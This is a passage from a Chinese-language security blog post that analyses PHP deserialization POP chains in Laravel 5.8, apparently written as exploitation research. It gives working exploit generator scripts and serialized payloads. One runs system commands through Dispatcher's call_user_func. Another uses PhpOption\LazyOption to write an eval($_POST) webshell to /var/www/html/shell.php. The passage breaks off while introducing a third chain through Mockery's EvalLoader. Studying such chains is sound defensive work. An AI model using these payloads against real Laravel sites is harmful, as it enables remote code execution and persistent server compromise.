class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A30%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>callback%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>file_put_contents%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>arguments%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fvar%<span class="number">2</span>Fwww%<span class="number">2</span>Fhtml%<span class="number">2</span>Fshell.php%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A28%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>PhpOption%<span class="number">5</span>CLazyOption%<span class="number">00</span>option%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>filter%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h3 id="0x04-POP链-2"><a href="#0x04-POP链-2" class="headerlink" title="0x04 POP链 2"></a>0x04 POP链 2</h3><p><strong>入口类</strong>：<code>Illuminate\Broadcasting\PendingBroadcast</code></p>
<p><strong>出口类</strong>：<code>Illuminate\Bus\Dispatcher</code></p>
<p>入口类和上一个POP链一样，入口在<code>Illuminate\Broadcasting\PendingBroadcast</code>中的析构函数<code>__destruct()</code>魔术方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Events</span>\<span class="title">Dispatcher</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $events;</span><br><span class="line">    <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Dispatcher $events, $event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全局搜索<code>dispatch()</code>方法，在<code>Illuminate\Bus\Dispatcher</code>中找到<code>dispatch()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span> <span class="keyword">implements</span> <span class="title">QueueingDispatcher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要满足if条件语句<code>if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command))</code>。跟进<code>$this-&gt;commandShouldBeQueued()</code>，知道该函数会判断<code>$command</code>是不是<code>ShouleQueue</code>类的一个实例，这里<code>ShouldQueue</code>只是一个接口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Illuminate\Contracts\Queue\ShouldQueue.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Queue</span>;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着能够调用<code>$this-&gt;dispatchToQueue()</code>方法，跟进该方法，我们能看到可利用的<code>call_user_func</code>函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! $queue <span class="keyword">instanceof</span> Queue) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Queue resolver did not return a Queue implementation.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method_exists($command, <span class="string">'queue'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $command-&gt;queue($queue, $command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pushCommandToQueue($queue, $command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>call_user_func</code>中调用的两个参数是<code>$this-&gt;queueResolver</code>和<code>$connection</code>。第一个参数是用户可控的，是该<code>Illuminate\Bus\Dispatcher</code>类的一个受保护成员变量：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/5.png" alt="5"></p>
<p>而第2个参数<code>$command</code>就是我们调用的回调函数需要执行的命令，可以看到，它应该满足下面这些条件：</p>
<ol>
<li>是接口<code>ShouldQueue</code>的一个实例化对象，才能进入<code>$this-&gt;dispatchNow()</code>；</li>
<li>该对象需要一个成员变量<code>$connection</code>（这里我之前一直以为要找到一个类，既满足是继承自接口<code>ShouldQueue</code>，又满足存在可控成员变量<code>$connection</code>，后来才知道，即使不存在也没关系，我们在构造exp的时候给一个就可以了）。</li>
</ol>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/6.png" alt="6"></p>
<p>全局搜索<code>implements ShouldQueue</code>，发现了这么几个类实现了该接口：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/7.png" alt="7"></p>
<p>在其中挑选一个，比如第一个<code>Illuminate\Broadcasting\BroadcastEvent</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $connection;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent(<span class="string">'whoami'</span>);</span><br></pre></td></tr></table></figure>

<p>最后得到的exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $connection;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $a = new Illuminate\Broadcasting\BroadcastEvent('ipconfig');</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="string">'system'</span>);</span><br><span class="line">    $c = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($b, $a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放到<code>public</code>目录下访问下，然后再为protected成员变量添加<code>\00</code>，最后得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;S:<span class="number">9</span>:<span class="string">"\00*\00events"</span>;O:<span class="number">25</span>:<span class="string">"Illuminatfe\Bus\Dispatcher"</span>:<span class="number">1</span>:&#123;S:<span class="number">16</span>:<span class="string">"\00*\00queueResolver"</span>;S:<span class="number">6</span>:<span class="string">"system"</span>;&#125;S:<span class="number">8</span>:<span class="string">"\00*\00event"</span>;O:<span class="number">38</span>:<span class="string">"Illuminate\Broadcasting\BroadcastEvent"</span>:<span class="number">1</span>:&#123;S:<span class="number">10</span>:<span class="string">"connection"</span>;S:<span class="number">8</span>:<span class="string">"ifconfig"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>用burp抓包可以看到成功执行：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/10.png" alt="10"></p>
<p>调用链：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/11.png" alt="11"></p>
<h4 id="写shell-1"><a href="#写shell-1" class="headerlink" title="写shell"></a>写shell</h4><p>因为这条POP链用的是<code>call_user_func</code>函数，它只能用回调函数处理字符串，也就是说回调函数最多只能接受一个参数，那么直接这样写shell就不太合适了，我们还是要继续找一个类，该类的方法有<code>call_user_func_array</code>，并且其参数用户可控即可。然后像前面介绍的一样，用<code>call_user_func</code>函数去调用该类的某个可利用方法，可以用<code>class_user_func(array($a, &#39;aaa&#39;));</code>来进行调用，其中<code>$a</code>为某个类的实例化对象，<code>aaa</code>是该类的某个可利用方法。（下一条pop链会重新介绍该方法）</p>
<p>这里还是选取<code>PhpOption\LazyOption</code>类，所以最后的exp就是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpOption</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyOption</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">        <span class="keyword">private</span> $arguments;</span><br><span class="line">        <span class="keyword">private</span> $option;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback, $arguments, $option)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;arguments = $arguments;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;option = $option;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $a = new PhpOption\LazyOption('file_put_contents', array('/var/www/html/shell.php', '&lt;? eval($_POST[1]);'), null);</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent(<span class="string">'abc'</span>);</span><br><span class="line">    $c = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($a, <span class="string">'filter'</span>));</span><br><span class="line">    $m = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($c, $b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"%00*%00events"</span>;O:<span class="number">25</span>:<span class="string">"Illuminate\Bus\Dispatcher"</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">"%00*%00queueResolver"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">20</span>:<span class="string">"PhpOption\LazyOption"</span>:<span class="number">3</span>:&#123;s:<span class="number">30</span>:<span class="string">"%00PhpOption\LazyOption%00callback"</span>;s:<span class="number">17</span>:<span class="string">"file_put_contents"</span>;s:<span class="number">31</span>:<span class="string">"%00PhpOption\LazyOption%00arguments"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">23</span>:<span class="string">"/var/www/html/shell.php"</span>;i:<span class="number">1</span>;s:<span class="number">19</span>:<span class="string">"&lt;? eval($_POST[1]);"</span>;&#125;s:<span class="number">28</span>:<span class="string">"%00PhpOption\LazyOption%00option"</span>;N;&#125;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">"filter"</span>;&#125;&#125;s:<span class="number">8</span>:<span class="string">"%00*%00event"</span>;O:<span class="number">38</span>:<span class="string">"Illuminate\Broadcasting\BroadcastEvent"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"connection"</span>;s:<span class="number">3</span>:<span class="string">"abc"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/14.png" alt="14"></p>
<h3 id="0x05-POP链-3"><a href="#0x05-POP链-3" class="headerlink" title="0x05 POP链 3"></a>0x05 POP链 3</h3><p>该POP链的入口方法和之前一样，还是<code>Illuminate\Broadcasting\PendingBroadcast</code>类的<code>__destruct()</code>方法。</p>
<p>上一条链是用<code>call_user_func</code>函数调用系统函数来执行命令，但其实<code>call_user_func</code>还可以调用类方法，有这么几种方式：</p>
<ol>
<li>通过数组键值对的方式，对类名进行回调，回调类方法；</li>
<li>通过类名直接调用静态方法</li>
<li>实例化一个对象，回调对象的类方法</li>
</ol>
<p>比如下面这个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dotest</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"dotest() is called"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">"Test"</span>;</span><br><span class="line"><span class="comment">// 通过数组键值对的方式，对类名进行回调，回调类方法</span></span><br><span class="line">call_user_func(<span class="keyword">array</span>($classname, <span class="string">'dotest'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化一个对象，回调对象的类方法</span></span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">call_user_func(<span class="keyword">array</span>($test, <span class="string">'dotest'</span>));</span><br></pre></td></tr></table></figure>

<p>如果需要传参，那么我们可以用<code>call_user_func(array($test, &#39;dotest&#39;), &#39;aaa&#39;)</code>，<code>aaa</code>就是我们传入的参数。</p>
<p>了解了<code>call_user_func</code>的其他用法，接下来就是寻找可以利用的类方法。</p>
<p>在<code>Mockery\Loader\EvalLoader</code>类中存在一个<code>load()</code>方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Mockery</span>\<span class="title">Generator</span>\<span class="title">MockDefinition</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mockery</span>\<span class="title">Loader</span>\<span class="title">Loader</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>load()</code>函数首先会判断<code>$definition-&gt;getClassName()</code>返回的类名是否存在，如果存在，直接<code>return</code>（第2个参数表示是否默认调用 <a href="https://www.php.net/manual/zh/language.oop5.autoload.php" target="_blank" rel="noopener">__autoload</a> ）；若不存在，就能继续执行<code>eval</code>语句。</p>
<p>那我们就继续看一下if条件语句中的关于<code>Mockery\Generator\MockDefinition</code>类的<code>getClassName()</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $config;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 